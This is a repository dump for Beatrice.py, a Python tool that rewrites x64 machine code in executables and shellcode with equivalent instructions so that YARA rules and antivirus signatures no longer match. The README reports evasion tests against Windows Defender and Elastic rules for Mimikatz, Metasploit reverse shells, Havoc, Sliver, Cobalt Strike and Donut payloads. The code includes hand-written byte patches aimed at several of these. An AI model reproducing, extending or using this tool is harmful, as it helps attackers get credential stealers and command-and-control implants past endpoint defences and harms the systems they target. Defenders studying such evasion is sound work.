@@ -1,0 +1,841 @@
+Project Path: arc_raskolnikov90_Beatrice.py_o8ou374r
+
+Source Tree:
+
+```txt
+arc_raskolnikov90_Beatrice.py_o8ou374r
+├── README.md
+├── beatrice.py
+└── requirements.txt
+
+```
+
+`README.md`:
+
+```md
+# Beatrice.py
+
+To bypass detection methods like YARA rules that look for certain bytes and memory scanners Beatrice.py patches machine code in binaries with alternative x64 assembly opcodes of the same size. This tool was also designed to modify machine code of executables or complex binaries that contain strings and other data, it will strictly match machine code to avoid breaking binaries.
+
+![image](https://i.imgur.com/BTunLsS.gif)
+
+# Usage
+
+```
+python3 beatrice.py           
+                                                                                                  
+@@@@@@@   @@@@@@@@   @@@@@@   @@@@@@@  @@@@@@@   @@@   @@@@@@@  @@@@@@@@       @@@@@@@   @@@ @@@  
+@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@@       @@@@@@@@  @@@ @@@  
+@@!  @@@  @@!       @@!  @@@    @@!    @@!  @@@  @@!  !@@       @@!            @@!  @@@  @@! !@@  
+!@   @!@  !@!       !@!  @!@    !@!    !@!  @!@  !@!  !@!       !@!            !@!  @!@  !@! @!!  
+@!@!@!@   @!!!:!    @!@!@!@!    @!!    @!@!!@!   !!@  !@!       @!!!:!         @!@@!@!    !@!@!   
+!!!@!!!!  !!!!!:    !!!@!!!!    !!!    !!@!@!    !!!  !!!       !!!!!:         !!@!!!      @!!!   
+!!:  !!!  !!:       !!:  !!!    !!:    !!: :!!   !!:  :!!       !!:            !!:         !!:    
+:!:  !:!  :!:       :!:  !:!    :!:    :!:  !:!  :!:  :!:       :!:       :!:  :!:         :!:    
+ :: ::::   :: ::::  ::   :::     ::    ::   :::   ::   ::: :::   :: ::::  :::   ::          ::    
+:: : ::   : :: ::    :   : :     :      :   : :  :     :: :: :  : :: ::   :::   :           :     
+                                                                                                  
+Usage: beatrice.py <binary>
+-h for usage and flags
+-v for Verbose mode
+-s for Safer mode, normal mode already mostly safe but still may break some binaries
+```
+
+# What this tool does
+
+### It will:
+
+- Generate patterns of simple assembly x64 instructions and their alternative instructions, turn them into machine code and patch the machine code if it matches.
+- Build different lists of assembly instructions that contain immediate values and other instructions that can’t be easily turned into patterns and apply appropriate changes to them.
+- Apply alternative ways to encode instructions whenever possible.
+- Create an identical binary functionality wise but with the above patches applied that will help evade YARA rules and some Antivirus solutions.
+
+### It will NOT:
+
+- Be a one size fits all solution.
+- Modify strings, so detection is still possible based on strings.
+- Modify imports or calls to Windows API functions that can be detected by some AVs and EDRs.
+- Completely evade behavior based detection. While this modifies the machine code enough to sometimes trick behavior based detection it won’t change the core functionality leading to still possibilities for detection.
+
+While this tool can make some binaries evade AVs on its own, it is best used combined with other evasion techniques (Examples: Modify shellcode to be used with a loader, help with custom or modified tooling)
+
+# Tests against Windows Defender and Elastic YARA rules ( April 2026 )
+
+### Executables (.exe)
+
+**Mimikatz with obfuscated strings** → [Evades Defender, see my Medium article.](https://medium.com/@luisgerardomoret_69654/modifying-mimikatz-to-evade-defender-2026-dc701000289d)
+
+**Metasploit** stageless reverse shell tcp → Inconsistent results against Defender sometimes it evades Defender sometimes it’s detected, evades Elastic YARA rules.
+
+**Havoc** payload with default profile and no modification  → Evades Defender (shown on gif above), detected by Elastic YARA due to default hashing and default profile.
+
+**Sliver** payload using its default obfuscation → Detected by Defender due to using Garble for obfuscation, evades Elastic YARA Rules.
+
+**Sliver** with skip-symbols option → Detected by both Defender and Elastic YARA due to strings.
+
+**AdaptixC2** payload with IAT Hiding → Already evasive against Defender but tool may help if Microsoft creates more signatures, evades Elastic YARA rules.
+
+**CobaltStrike** stageless payload → Bypassed detection bytes but still detected by few strings.
+
+### Raw binaries / Shellcode (.bin)
+
+Using [DefenderYara](https://github.com/roadwy/DefenderYara/tree/main/Trojan/Win64), [defender2yara](https://github.com/t-tani/defender2yara/tree/yara-rules/Win64/Trojan) and [Elastic rules](https://github.com/elastic/protections-artifacts) to test.
+
+**Metasploit** stageless reverse shell tcp → Evades YARA rules.
+
+**Havoc** payload with custom profile and no modification  → Evades Defender YARA rules, detected by Elastic YARA due to default hashing and default profile.
+
+**Sliver** payload using its default obfuscation → Evades YARA rules.
+
+**Sliver** with skip-symbols option → Detected by both Defender and Elastic YARA due to strings.
+
+**AdaptixC2** payload with IAT Hiding → Evades YARA rules.
+
+**CobaltStrike** stageless payload → Bypassed detection bytes but still detected by few strings.
+
+**Donut** shellcode  → Evades YARA rules.
+
+Notes on Havoc: Ran on Docker to solve compiler compatibility issues so payloads compile as they originally do before using the tool.
+
+Notes on CobaltStrike: I don’t own license, I have access to a course that provides labs and includes CobaltStrike.
+
+# Known Issues
+
+Golang compiled binaries that use Garble for obfuscation may break. 
+
+Despite working most of the time some binaries may still break, that’s why safe mode was added as an option to just use the most basic features.
+
+# Support Me
+
+https://buymeacoffee.com/lainkusanagi
+
+```
+
+`beatrice.py`:
+
+```py
+#!/usr/bin/env python3
+import sys
+import re
+from keystone import Ks, KS_ARCH_X86, KS_MODE_64
+import itertools
+import pefile
+import sys
+from concurrent.futures import ProcessPoolExecutor
+import os
+from collections import Counter
+from capstone import *
+from collections import defaultdict
+
+MAX_WORKERS = os.cpu_count()
+
+md = Cs(CS_ARCH_X86, CS_MODE_64)
+md.detail = False  # turn off if you don't need it (faster)
+
+def is_complex(insn):
+    mnem = insn.mnemonic
+    op = insn.op_str
+
+    # avoid repeated lower() calls
+    op_lower = op.lower()
+
+    # fast checks
+    if "ptr [rax], al" in op_lower:
+        return False
+        
+    if "tr" in op_lower:
+        return True
+    
+    try:
+        if mnem.startswith("mov") and "xmm" in op_lower:
+            return True
+    except Exception:
+            pass
+    
+    if "0x" in op_lower:
+        # check mnemonic conditions
+        return (
+            mnem.startswith("mov") or
+            mnem.startswith("j") or
+            mnem.startswith("add") or
+            mnem.startswith("sub")
+        )
+        
+     
+    if "r" and "d" in op_lower:
+        return True
+    return False
+
+#already works
+def find_twoins(prev, insn):
+
+    if prev is not None:
+        if prev.mnemonic == "mov" and ("[r" in prev.op_str and "p " in prev.op_str) and insn.mnemonic == "add" and prev.op_str[0:4] == insn.op_str[0:4] and len(insn.op_str) < 9:
+            instr1 = prev.mnemonic + " " + prev.op_str
+            instr2 = insn.mnemonic + " " + insn.op_str
+            twoins = instr1 + "; " + instr2
+            movadd.append(twoins)
+            
+        elif (prev.mnemonic == "mov" and prev.op_str.startswith("r") and ", r" in prev.op_str and "0x" in insn.op_str) or (insn.mnemonic == "mov" and  insn.op_str.startswith("r") and ", r" in insn.op_str and "0x" in prev.op_str):
+            instr1 = prev.mnemonic + " " + prev.op_str
+            instr2 = insn.mnemonic + " " + insn.op_str
+            twoins = instr1 + "; " + instr2
+            if "+ 0x" in twoins:
+                if len(twoins[twoins.index("+ 0x"):]) < 10:
+                    movcomplex.append(twoins)
+            else:
+                movcomplex.append(twoins)
+            
+        elif (prev.mnemonic == "xor" and prev.op_str[0].isalpha() and ", " in prev.op_str and "0x" in insn.op_str) or (insn.mnemonic == "xor" and  insn.op_str[0].isalpha() and ", r" in insn.op_str and "0x" in prev.op_str):
+            instr1 = prev.mnemonic + " " + prev.op_str
+            instr2 = insn.mnemonic + " " + insn.op_str
+            try:
+                if (instr1.split(",")[0][3:]==instr1.split(",")[1] or instr2.split(",")[0][3:]==instr2.split(",")[1] ):
+                   xorcomplex.append(instr1 + "; " + instr2)
+            except Exception:
+                pass
+
+    return insn
+
+movadd = []         
+movcomplex = []
+xorcomplex = []
+
+def handle_pe(data, complexops):
+    pe = pefile.PE(data=data, fast_load=True)
+    pe.parse_data_directories(directories=[])
+
+    append = complexops.append  # local binding (faster)
+    
+    for section in pe.sections:
+        if not (section.Characteristics & 0x20000000):
+            continue
+
+        code = section.get_data()
+        addr = section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
+        prev = None
+        for insn in md.disasm(code, addr):
+            next_addr = insn.address + insn.size
+            prev = find_twoins(prev, insn)
+            if is_complex(insn):
+                append(f"{insn.mnemonic} {insn.op_str}")
+                
+def handle_raw(data, complexops):
+    append = complexops.append  # local binding (faster)
+    prev = None
+    for insn in md.disasm(data, 0x1000):
+        prev = find_twoins(prev, insn)
+        if is_complex(insn):
+            append(f"{insn.mnemonic} {insn.op_str}")
+            
+       
+
+def is_pe(data):
+    return data[:2] == b'MZ'
+    
+class TrieNode:
+    __slots__ = ("children", "value")
+
+    def __init__(self):
+        self.children = {}   # byte -> TrieNode
+        self.value = None    # replacement bytes (if terminal)
+
+
+def build_trie(patches):
+    root = TrieNode()
+
+    for old, new in patches:
+        node = root
+        for b in old:  # iterates as ints (0–255)
+            node = node.children.setdefault(b, TrieNode())
+        node.value = new
+
+    return root
+
+
+def patch_binary(data: bytes, patches):
+    root = build_trie(patches)
+
+    output = bytearray(data)
+    n = len(output)
+
+    verbose = "-v" in sys.argv
+    total = 0
+
+    i = 0
+    while i < n:
+        node = root
+        j = i
+        last_match = None  # (end_index, replacement)
+
+        # Walk forward in trie
+        while j < n:
+            node = node.children.get(output[j])
+            if node is None:
+                break
+
+            j += 1
+
+            if node.value is not None:
+                last_match = (j, node.value)
+
+        if last_match:
+            end, replacement = last_match
+            old = output[i:end]
+
+            output[i:end] = replacement
+
+            if verbose:
+                print(f"[+] Patch at offset 0x{i:x}: {bytes(old).hex()} -> {replacement.hex()}")
+            elif total % 100 == 0 and total > 0:
+                print(f"[+] {total} patches applied")
+
+            total += 1
+            i = end  # skip past match
+        else:
+            i += 1
+
+    return bytes(output), total
+
+
+# Initialize Keystone
+ks = Ks(KS_ARCH_X86, KS_MODE_64)
+
+# 64-bit general-purpose registers
+regs = ["rax", "rbx", "rbp", "rcx", "rdx", "rsi", "rdi","rsp", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
+    
+regs86 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]  
+
+patches = []
+
+
+LIT = 0
+VAR = 1
+
+_encode_cache = {}
+
+def encode(instr):
+    """
+    Optimized instruction encoder using Keystone with caching.
+    Returns bytes or None if invalid.
+    """
+    if instr in _encode_cache:
+        return _encode_cache[instr]
+
+    try:
+        encoding, _ = ks.asm(instr)
+        if not encoding:
+            return None
+        result = bytes(encoding)
+        _encode_cache[instr] = result
+        return result
+    except Exception:
+        return None
+
+
+
+def compile_pattern(pattern, key_order):
+    compiled = []
+    i = 0
+    while i < len(pattern):
+        if pattern[i] == '{':
+            j = pattern.find('}', i)
+            var_name = pattern[i+1:j]
+            idx = key_order[var_name]
+            compiled.append((VAR, idx))
+            i = j + 1
+        else:
+            j = i
+            while j < len(pattern) and pattern[j] != '{':
+                j += 1
+            compiled.append((LIT, pattern[i:j]))
+            i = j
+    return compiled
+
+def get_keys(p1, p2):
+    keys = ["a"]
+    if "{b}" in p1 or "{b}" in p2:
+        keys.append("b")
+    if "{c}" in p1 or "{c}" in p2:
+        keys.append("c")
+    if "{d}" in p1 or "{d}" in p2:
+        keys.append("d")
+    return keys
+
+
+def generate_patch_string(compiled1, compiled2, combo):
+    """
+    combo: tuple of register names as strings
+    Returns two instruction strings
+    """
+    instr1_pieces = [v if t == LIT else combo[v] for t, v in compiled1]
+    instr2_pieces = [v if t == LIT else combo[v] for t, v in compiled2]
+    instr1 = "".join(instr1_pieces)
+    instr2 = "".join(instr2_pieces)
+    return instr1, instr2
+
+
+
+def make_rex(w, r, x, b):
+    """Construct REX prefix (or return b'' if not needed)."""
+    rex = 0x40
+    if w: rex |= 0x08  # 64-bit operand
+    if r: rex |= 0x04
+    if x: rex |= 0x02
+    if b: rex |= 0x01
+    return bytes([rex]) if rex != 0x40 else b''
+    
+ALT_ENCODINGS = []
+
+for dst_i in range(16):
+    for src_i in range(16):
+        dst_lo = dst_i & 0b111
+        src_lo = src_i & 0b111
+
+        rex_r = (dst_i >> 3) & 1
+        rex_b = (src_i >> 3) & 1
+
+        # mov r64, r/m64 (8B)
+        modrm_8b = 0xC0 | (dst_lo << 3) | src_lo
+        rex_8b = 0x40 | 0x08 | (rex_r << 2) | rex_b
+        rex_8b = bytes([rex_8b]) if rex_8b != 0x40 else b''
+        alt1 = rex_8b + bytes([0x8B, modrm_8b])
+
+        # mov r/m64, r64 (89)
+        modrm_89 = 0xC0 | (src_lo << 3) | dst_lo
+        rex_89_val = 0x40 | 0x08 | (((src_i >> 3) & 1) << 2) | ((dst_i >> 3) & 1)
+        rex_89 = bytes([rex_89_val]) if rex_89_val != 0x40 else b''
+        alt2 = rex_89 + bytes([0x89, modrm_89])
+
+        ALT_ENCODINGS.append((alt1, alt2))
+
+
+
+def patches_chunk(args, altencoding=False):
+    compiled1, compiled2, combos = args
+    local_patches = []
+
+    for combo in combos:
+        instr1, instr2 = generate_patch_string(compiled1, compiled2, combo)
+       
+        
+        enc1 = encode(instr1)
+        if not enc1:
+            continue
+            
+        enc2 = encode(instr2)
+        if not enc2:
+            continue
+        
+        difference = len(enc1) - len(enc2)
+        
+        if difference > 0:
+            if difference % 2:
+                enc2 += b"\x90" * difference
+            else:
+                enc2 += b"\x87\xFF" * (difference // 2)        
+        if altencoding:
+            for base1, base2 in ALT_ENCODINGS:
+                alt1 = base1 + enc1
+                alt2 = base2 + enc2
+
+                if len(alt1) == len(alt2) and len(alt1) > 3:
+                    local_patches.append((alt2, alt1))
+
+                    # second variant
+                    local_patches.append((enc2 + base2, enc1 + base1))
+                    
+        else:
+            if len(enc1) != len(enc2) or len(enc1) <= 3:
+                continue
+            if "-s" in sys.argv and enc1.hex().count("0") > 6:
+               continue
+            local_patches.append((enc1, enc2))
+
+    return local_patches
+
+def chunked(iterable, size):
+    chunk = []
+    for item in iterable:
+        chunk.append(item)
+        if len(chunk) == size:
+            yield chunk
+            chunk = []
+    if chunk:
+        yield chunk
+
+
+def generate_patches(regs, patterns, altencoding=False, chunk_size=200000):
+   
+
+    # Ensure regs are strings
+    regs_str = [r if isinstance(r, str) else r.decode() for r in regs]
+
+    tasks = []
+
+    for p1, p2 in patterns:
+        keys = get_keys(p1, p2)
+        key_order = {k: i for i, k in enumerate(keys)}
+        n = len(keys)
+
+        compiled1 = compile_pattern(p1, key_order)
+        compiled2 = compile_pattern(p2, key_order)
+
+        perms = itertools.permutations(regs_str, n)
+
+        for chunk in chunked(perms, chunk_size):
+            combos = [tuple(c) for c in chunk]
+            tasks.append((compiled1, compiled2, combos))
+
+    with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        for res in executor.map(patches_chunk, tasks, itertools.repeat(altencoding)):
+            patches.extend(res)
+
+    return patches
+                
+def minusconverter(val):
+    """
+    Convert a signed value string (like "-0x20") into 64-bit two's complement integer.
+    Returns as hex string: 0xffffffffffffffe0
+    """
+    # Convert string to int, auto-detect hex or decimal
+    val_int = int(val, 0)  # 0 base lets Python handle 0x prefix automatically
+
+    if val_int < 0:
+        val_int = (1 << 64) + val_int  # 64-bit two's complement
+
+    return f"0x{val_int:016X}"
+    
+def main():
+    print('''                                                                                                  
+@@@@@@@   @@@@@@@@   @@@@@@   @@@@@@@  @@@@@@@   @@@   @@@@@@@  @@@@@@@@       @@@@@@@   @@@ @@@  
+@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@@       @@@@@@@@  @@@ @@@  
+@@!  @@@  @@!       @@!  @@@    @@!    @@!  @@@  @@!  !@@       @@!            @@!  @@@  @@! !@@  
+!@   @!@  !@!       !@!  @!@    !@!    !@!  @!@  !@!  !@!       !@!            !@!  @!@  !@! @!!  
+@!@!@!@   @!!!:!    @!@!@!@!    @!!    @!@!!@!   !!@  !@!       @!!!:!         @!@@!@!    !@!@!   
+!!!@!!!!  !!!!!:    !!!@!!!!    !!!    !!@!@!    !!!  !!!       !!!!!:         !!@!!!      @!!!   
+!!:  !!!  !!:       !!:  !!!    !!:    !!: :!!   !!:  :!!       !!:            !!:         !!:    
+:!:  !:!  :!:       :!:  !:!    :!:    :!:  !:!  :!:  :!:       :!:       :!:  :!:         :!:    
+ :: ::::   :: ::::  ::   :::     ::    ::   :::   ::   ::: :::   :: ::::  :::   ::          ::    
+:: : ::   : :: ::    :   : :     :      :   : :  :     :: :: :  : :: ::   :::   :           :     
+                                                                                                  ''')
+    if  "-h" in sys.argv or len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <binary>")
+        print("-h for usage and flags")
+        print("-v for Verbose mode")
+        print("-s for Safer mode, normal mode already mostly safe but still may break some binaries")
+        sys.exit(1)
+
+    filename = sys.argv[1]
+
+    with open(filename, "rb") as f:
+        data = f.read()
+    
+    with open(filename+".bak", "wb") as f:
+        f.write(data)
+        
+    print("[+] Backup "+filename+".bak created")
+   
+    if ("-s" in sys.argv):
+        print("[*] Using safer mode")
+    complexops = []
+    if is_pe(data):
+        print("[+] Detected PE file")
+        handle_pe(data, complexops)
+    else:
+        print("[+] Treating as raw binary")
+        handle_raw(data, complexops)
+    
+    
+    bytelist = []
+    
+    movdlist = []
+    filtered = []
+    
+    other = []
+    movshift = []
+    movx = []
+    
+    for arit in complexops:
+        if (
+        (arit.startswith("add") or arit.startswith("sub"))
+        and "[" not in arit
+        and "fff" not in arit
+        and "-" not in arit
+        and "0x" in arit
+        ):
+            bytelist.append(arit)
+        elif arit.startswith("mov ") and "byte ptr" in arit and arit.count("+") > 1 and "rsp" not in arit:
+            movshift.append(arit)
+        elif arit.startswith("mov") and "xmm" in arit:
+            movdlist.append(arit)
+        elif arit.startswith("movzx") and "word ptr" in arit:
+            movx.append(arit)
+        else:
+            filtered.append(arit)
+
+    complexops = filtered
+    
+    if len(complexops) > 40:
+        filtered = []
+        for o in complexops:
+            if "j" in o:
+                other.append(o)
+            else:
+                filtered.append(o)
+        
+        complexops = filtered
+        countops = Counter(other).most_common(30)
+        other = []
+    
+        for val, count in countops:
+           other.append(val) 
+            
+    bytelist = list(set(bytelist)) 
+    movdlist = list(set(movdlist)) 
+    
+
+    countops = Counter(complexops).most_common(30)
+    complexops = []
+    
+    for val, count in countops:
+       complexops.append(val)
+    
+    complexops = complexops + other
+    complexops = complexops[1:]
+    print("[+] Generating patches")
+    
+    #basic intructions patterns and their replacements
+    
+    patterns = [
+        ("push {a}; mov {a},{b}", "push {a}; push {b}; pop {a}"),
+        ("mov {a},{b}; push {a}", "push {b}; pop {a}; push {a}"),
+        ("mov {a},{b}; mov {c},{b}", "mov {a},{b}; push {b}; pop {c}"),
+        ("mov {a},{b}; mov {c},{d}", "mov {a},{b}; push {d}; pop {c}"),
+        ("push {a}; xor {b},{b}", "push {a}; sub {b},{b}"),
+        ("xor {a},{a}; dec {a}", "or {a},0xffffffffffffffff"),
+        ("lea {a}, [{b} + {c}]", "lea {a}, [{c} + {b}]"),
+        ("push {a}; jmp {b}", "push {a}; push {b}; ret"),
+        ("mov {a},QWORD PTR [{a}]; test {a},{a}", "mov {a},QWORD PTR [{a}]; or {a},{a}"),
+        ("cmp {a}, 0", "test {a},{a}"),
+        
+    ]
+
+    generate_patches(regs, patterns)
+
+    allreg = regs + regs86
+  
+
+    allregpatterns = [
+        ("xor {a},{a}; xor {b},{b}", "sub {a},{a}; sub {b},{b}"),
+        ("mov {a},{b}; xor {c},{c}", "mov {a},{b}; sub {c},{c}"),
+        ("xor {c},{c}; mov {a},{b}", "sub {c},{c}; mov {a},{b}"),
+    ]
+    
+    
+    if ("-s" not in sys.argv):
+        generate_patches(allreg, allregpatterns)
+        
+        #convert add into sub operations and convert the immediate to minus (and vice versa)
+        for b in bytelist:
+            
+            if b[7].isalpha():
+                split = 10
+            elif b[6] == ",":
+                split = 8
+            else:
+                split = 9
+        
+            half = b[:split]
+            minus = minusconverter("-" + b[split:])
+        
+            if "add" in half:
+                half = half.replace("add", "sub")
+            else:
+                half = half.replace("sub", "add") 
+            enc1 = encode(f"{b}")
+            enc2 = encode(f"{half}{minus}")
+            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3 and len(enc1) < 9:
+                patches.append((enc1, enc2))  
+
+    
+        # convert sse to avx
+        for x in movdlist:
+    
+            enc1 = encode(x)
+            enc2 = encode(f"v{x}")
+            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
+                patches.append((enc1, enc2))
+                
+                
+        reg_pattern = re.compile(r'\b(r[0-9a-z]+)\b')
+    
+        mem_pattern = re.compile(r'\[(.*?)\]')
+        
+        #Handle cases where mov and xor instructions are next to intructions that cant be put into patterns easily (example mov rax, rcx; je 0x12)
+
+        for b in list(set(movcomplex)):
+            split = b.split(";")
+            movop = split[0]
+            if "mov" in split[1]:
+                movop = split[1]
+            reg = reg_pattern.findall(movop)
+            try:
+                pushpop = b.replace(f"mov {reg[0]}, {reg[1]}",f"push {reg[1]}; pop {reg[0]}")
+            except Exception:
+                continue
+            enc1 = encode(b)
+            enc2 = encode(pushpop)
+            if not enc2:
+                continue
+            
+            difference = len(enc1) - len(enc2)
+            
+            if difference > 0:
+                if difference % 2:
+                    enc2 += b"\x90" * difference
+                else:
+                    enc2 += b"\x87\xFF" * (difference // 2)
+                  
+            else:
+                for i in range(0,int(difference/2)):
+                    enc2 = enc2 + b"\x87\xFF"
+            
+            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
+                patches.append((enc1, enc2))
+                continue
+        
+        for b in xorcomplex:
+            split = b.split(";")
+            xorop = split[0]
+            if "xor" in split[1]:
+                xorop = split[1]
+            reg = xorop[4:xorop.index(",")].strip()
+            subop = b.replace(f"xor {reg}, {reg}",f"sub {reg}, {reg}")
+            enc1 = encode(b)
+            enc2 = encode(subop)
+            if not enc2:
+                continue
+            
+            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
+                patches.append((enc1, enc2))
+
+        # shift places of instructions like mov dl,BYTE PTR [rbx+rax*1+0x1] to mov dl,BYTE PTR [rax+rbx*1+0xf0] resulting in different encoding
+        for b in movshift:
+            
+            bracket = mem_pattern.findall(b)
+            reg = reg_pattern.findall(" ".join(bracket))
+            shift = b.replace(f"{reg[0]} + {reg[1]}",f"{reg[1]} + {reg[0]}")
+            enc1 = encode(b)
+            enc2 = encode(shift)
+    
+            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
+                patches.append((enc1, enc2))
+                
+       
+        for b in movx:
+            alt = b.replace("zx","sx")
+            enc1 = encode(b)
+            enc2 = encode(alt)
+            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
+                patches.append((enc1, enc2))
+          
+        #rewrite instructions like mov rdx, qword ptr [rbp - 0x10]; add rdx, rcx into mov rdx, rcx; add rdx, qword ptr [rbp - 0x10]
+              
+        for b in movadd:
+            instr = b.split(";")
+            half1 = instr[0][4:]
+            half2 = instr[1][4:]
+            enc1 = encode(b)
+            enc2 = encode(f"mov {half2}; add {half1}")
+            
+            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
+                patches.append((enc1, enc2))
+                
+        
+        # patterns + most common instructions that cant be easily put into patterns (m)
+                
+        complexpatterns = []
+        
+        for m in complexops:             
+            complexpatterns.extend([
+            (f"test {{a}},{{a}}; {m}", f"or {{a}},{{a}}; {m}"),
+            (f"{m}; add {{a}},{{a}}", f"{m}; shl {{a}}, 1"),
+            ])
+            
+        generate_patches(allreg, complexpatterns)
+    
+    
+    #manual patches, feel free to add super specific patches
+    
+    patches.extend([
+    
+        #donut
+        (b"\x33\xC0\xEB\x08", b"\x29\xC0\xEB\x08"),
+        (b"\x74\x14\x33\xD2", b"\x74\x14\x29\xD2"),
+
+        #cobaltstrike
+        (b"\x48\x89\xC2\x83\xE2\x03", b"\x50\x5A\x90\x83\xE2\x03"),
+        
+        #adaptix agent.x64.bin
+        (b"\x0F\xB6\x55\x12\x88\x10",b"\x0F\xBE\x55\x12\x88\x10"),
+        
+        #mimikatz
+        (b"\x01\x00\x00\xC0\x48\x85\xC9", b"\x01\x00\x00\xC0\x48\x09\xC9"),
+        (b"\x24\x02\x0F\x84\x00\x00", b"\x24\x02\x0F\x84\x00\x01"),
+        (b"\x05\x02\x0F\x0D\x09", b"\x2D\xFE\xF0\xF2\xF6"),
+        (b"\x24\x43\x72\x64\x41\x48\xFF\x15", b"\x24\x43\x72\x64\x41\x48\x00\x15"),
+        (b"\xF3\x0F\x6F\x6C\x24\x30", b"\xC5\xFA\x6F\x6C\x24\x30"),
+        (b"\x48\x8B\xCA\xF3", b"\x48\x89\xD1\xF3"),
+    ])
+    
+    patched, total = patch_binary(data, patches)
+    ftotal = total
+
+    with open(filename, "wb") as f:
+        f.write(patched)
+    
+    patches.clear()
+    
+    with open(filename, "rb") as f:
+        data = f.read()
+        
+    altencoding_patterns = [
+        ("mov {a},{b}", "mov {a},{b}"),
+        ("xor {a},{a}", "xor {a},{a}"),
+        ("push {a}; pop {b}", "push {a}; pop {b}"),
+        ("div {a}", "div {a}"),
+        ("inc {a}", "inc {a}")
+    ]
+
+    generate_patches(allreg, altencoding_patterns, altencoding=True)
+    print("[+] Applying alternative encoding")
+
+    patched, total = patch_binary(data, patches)
+    
+    if total == 0:
+        l2 = [(y, x) for (x, y) in ALT_ENCODINGS]
+        ALT_ENCODINGS.clear()
+        ALT_ENCODINGS.extend(l2)
+        generate_patches(allreg, altencoding_patterns, altencoding=True)
+        patched, total = patch_binary(data, patches)
+    ftotal = ftotal + total
+    print(f"[+] Total applied patches: {ftotal}")
+
+    with open(filename, "wb") as f:
+        f.write(patched)
+    
+    print("[+] Done.")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+`requirements.txt`:
+
+```txt
+keystone-engine>=0.9.2
+pefile>=2024.8.26
+capstone>=6.0.0a5
+```
